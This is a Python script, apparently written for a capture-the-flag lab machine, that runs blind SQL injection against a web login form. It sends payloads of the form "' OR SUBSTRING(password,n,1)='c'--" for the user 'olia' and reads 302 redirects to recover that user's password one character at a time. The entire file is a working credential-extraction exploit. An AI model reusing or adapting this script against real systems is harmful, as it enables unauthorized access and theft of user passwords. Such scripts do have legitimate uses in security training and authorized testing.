import requests

url = "http://10.129.1.78"

# BURPSUITE
proxies = {"http": "http://127.0.0.1:8080"}

headers = {
    "Host": "10.129.1.78",
    "Content-Length": "76",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://10.129.1.78",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://10.129.1.78/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}
# CHARS WORDLIST
with open("/usr/share/seclists/Fuzzing/alphanum-case-extra.txt") as f:
    charset = f.read().splitlines()

discovered_password = ""

for position in range(1, 21):
    found_char = False
    for char in charset:
        # BODY REQUEST
        payload = f"Username=olia&Password=tesdasddsaasdsadt'+OR+SUBSTRING(password,{position},1)='{char}'--+-"

        response = requests.post(url, headers=headers, data=payload, proxies=proxies)
        
        if response.status_code == 302:
            discovered_password += char
            print(f"Found character at position {position}: {char}")
            found_char = True
            break 

    if not found_char:
        print(f"No character found at position {position}")
        break

print(f"Discovered password: {discovered_password}")
